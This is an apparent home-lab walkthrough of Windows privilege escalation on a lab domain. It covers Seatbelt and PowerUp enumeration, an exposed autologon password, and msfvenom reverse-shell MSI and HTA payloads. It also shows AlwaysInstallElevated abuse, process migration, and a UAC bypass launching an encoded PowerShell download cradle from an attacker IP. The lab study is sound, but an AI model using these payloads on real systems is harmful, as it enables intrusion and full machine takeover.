# 2. Enumerating machine, Privilege Escalation, and Local Persistence

## Local Enumeration:

- We can use Covenant seatbelt module to enumerate all local information.

```powershell
[07/24/2023 13:16:23 UTC] Seatbelt completed

(singhx) > Seatbelt -group=all
====== AMSIProviders ======


  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}

  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23050.5-0\MpOav.dll"



====== AntiVirus ======


  Engine                         : Windows Defender

  ProductEXE                     : windowsdefender://

  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe



====== AppLocker ======


  [*] AppIDSvc service is Stopped


    [*] Applocker is not running because the AppIDSvc is not running

---------------------------snip------------------------------

====== WMIFilterBinding ======


  Consumer                       : __EventFilter.Name="SCM Event Log Filter"

  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"

  CreatorSID                     : S-1-5-32-544



====== WSUS ======


  UseWUServer                    : False

  Server                         : 

  AlternateServer                : 

  StatisticsServer               : 

[*] Completed collection in 7.957 seconds
```

## Autologon Misconfiguration:

- We will now import powerUp.ps1 script using covenant PowerShellImport command.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/044ffa8e-c19b-47f8-b624-07800b6f7702)

- After importing is done we will send the command `powershell invoke-allchecks`

```powershell
[07/24/2023 12:59:55 UTC] PowerShell completed

(singhx) > powershell invoke-allchecks


[*] Running Invoke-AllChecks



--------------snip-----------------



DefaultDomainName    : mayorsec

DefaultUserName      : s.chisholm

DefaultPassword      : FallOutBoy1!

AltDefaultDomainName : 

AltDefaultUserName   : 

AltDefaultPassword   : 



[*] Checking for modifidable registry autoruns and configs...



```

- Here we got autologin credentials. The same we can achieve with SeatBelt in Covenant.

```powershell
[07/24/2023 13:10:31 UTC] Seatbelt completed

(singhx) > Seatbelt WindowsAutoLogon



====== WindowsAutoLogon ======


  DefaultDomainName              : mayorsec

  DefaultUserName                : s.chisholm

  DefaultPassword                : FallOutBoy1!

  AltDefaultDomainName           : 

  AltDefaultUserName             : 

  AltDefaultPassword             : 


[*] Completed collection in 0.024 seconds
```

## AlwaysInstalledElevated Misconfiguration:

- To reveal the misconfiguration of AlwaysInstallElevated we can use Covenant's built-in tool called SharpUp audit.

```powershell
[07/24/2023 13:32:06 UTC] SharpUp completed

(singhx) > SharpUp audit

=== SharpUp: Running Privilege Escalation Checks ===

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1

  HKCU:    1
```
- We can achieve the same using PowerUp.ps1
- For this, we need to import PowerUp.ps1 and run the command `powershell invoke-allchecks`

```powershell
07/24/2023 15:21:44 UTC] PowerShell completed

(singhx) > powershell invoke-allchecks


[*] Running Invoke-AllChecks

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI

```
- In order to abuse this feature, we need to generate a malicious payload using msfvenom.
- In cmd use reverse shell encoded command using covenant.

  ![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/b1a8d3ff-53b2-4023-920f-68f5c1987843)

```bash
└─$ msfvenom -p windows/exec CMD="<powershell cmd>" -f msi -o installer.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 449 bytes
Final size of msi file: 159744 bytes
Saved as: installer.msi
```

- Using the Covenant upload function we will upload generated malicious file to our target.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/6f67f5ce-c269-44d9-b308-8da78df23959)

- Change the working directory in Covenant to Public.

``` powershell
[07/24/2023 15:34:44 UTC] ChangeDirectory completed

(singhx) > ChangeDirectory C:\Users\Public\

C:\Users\Public

[07/24/2023 15:34:52 UTC] ListDirectory completed

(singhx) > ListDirectory

Name                             Length  CreationTimeUtc       LastAccessTimeUtc     LastWriteTimeUtc

----                             ------  ---------------       -----------------     ----------------
C:\Users\Public\desktop.ini      174     12/7/2019 9:14:54 AM  7/24/2023 3:34:22 PM  12/7/2019 9:12:42 AM

C:\Users\Public\Installer,msi    159744  7/24/2023 3:34:22 PM  7/24/2023 3:34:22 PM  7/24/2023 3:34:22 PM
```

- Next step is to run the uploaded file using cmd: `shell msiexec /quiet /qn /i installer.msi` in Covenant.

``` powershell
[07/24/2023 15:53:00 UTC] Shell completed

(singhx) > shell msiexec /quiet /qn /i Installer.msi
```
- We got another Grunts running.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/7682c014-46f4-41c8-b9d4-2a4ba9cc4038)

- On interacting with the latest Grunts we get the user as System.

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/c698141c-8ec1-4929-b08b-b878f4fe463d)

## Metasploit (AlwaysInstalledElevated Misconfiguration):
- The same we can achieve by using Metasploit.
- Generate a malicious `.hta` file using msfvenom and transfer it to the target machine.

 ```bash
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8000 LHOST=xxx.xxx.xxx.186 -f hta-psh -o file.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of hta-psh file: 7801 bytes
Saved as: file.hta
```
- Set up a listener in metasploit.

```bash
use msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > set lhost wlan0 
lhost => wlan0
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
- When the Victim user opens the malicious file we will get the shell to our system.
- After that run exploit suggester in meterpreter.

```bash
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: mayorsec\s.chisholm
meterpreter > run post/multi/recon/local_exploit_suggester 
[+] 10.120.116.10 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.
[*] Running check method for exploit 43 / 43
[*] 10.120.116.10 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
 ```
- Background the process and use `exploit/windows/local/always_install_elevated`

```bash
msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > run
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- To get a stable shell we will migrate to a process owned by the system user.

```meterpreter
meterpreter > ps

Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                       x64   0
 72    4     Registry                     x64   0

-----------------------------snip-------------------------------------

516   500   csrss.exe
 576   500   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 600   508   services.exe                 x64   0

meterpreter > migrate 576
[*] Migrating from 7120 to 576...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WORKSTATION-01
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : mayorsec
Logged On Users : 7
Meterpreter     : x64/windows
meterpreter > 
```

## UAC Bypass (Covenant):

- In covenant, Import powershell script named [Helper.ps1](https://github.com/microsoft/PowerShellForGitHub/blob/master/Helpers.ps1).
- Run teh cmd: ` powershell helper -custom "cmd.exe /c <powershell launcher command>"`
- Few seconds after sending the command we get a new Grunts to our Covenant.

```powershell
(singhx) > PowerShellImport

PowerShell Imported

[07/24/2023 18:28:20 UTC] PowerShell completed

(singhx) > powershell helper -custom "cmd.exe /c powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAA3AC4AMQA4ADYALwByAGUAdgBlAC4AcABzADEAJwApAA=="

    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open

Name                           Property                                                                                 

----                           --------                                                                              

command                                                                                                                 
DelegateExecute : 

PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command

PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open

PSChildName     : command

PSDrive         : HKCU

PSProvider      : Microsoft.PowerShell.Core\Registry
```

![image](https://github.com/thesinghsec/Active-Directory--Home-Lab-/assets/126919241/ff826b3c-61f9-442b-bd4f-f04a13072af0)

## UAC Bypass (Metasploit):

- As we already have a session of low level user let's start inteact with it.
- Run the following commands as below:

```meterpreter
msf6 exploit(windows/local/always_install_elevated) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: mayorsec\s.chisholm
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.120.116.10 - Collecting local exploits for x64/windows...
[*] 10.120.116.10 - 186 exploit checks are being tried...
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/bypassuac_dotnet_profiler
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > run

[*] Started reverse TCP handler on 192.168.107.186:4444 
[*] Sending stage (200774 bytes) to 192.168.107.117
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[*] Meterpreter session 3 opened (192.168.107.186:4444 -> 192.168.107.117:56879) at 2023-07-24 19:58:08 +0100
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         meterpreter x64/windows  mayorsec\s.chisholm @ WORKSTATION-01  192.168.107.186:8000 -> 192.168.107.117:54065 (10.120.116.10)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WORKSTATION-01  192.168.107.186:4444 -> 192.168.107.117:54079 (10.120.116.10)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WORKSTATION-01  192.168.107.186:4444 -> 192.168.107.117:56879 (10.120.116.10)

msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
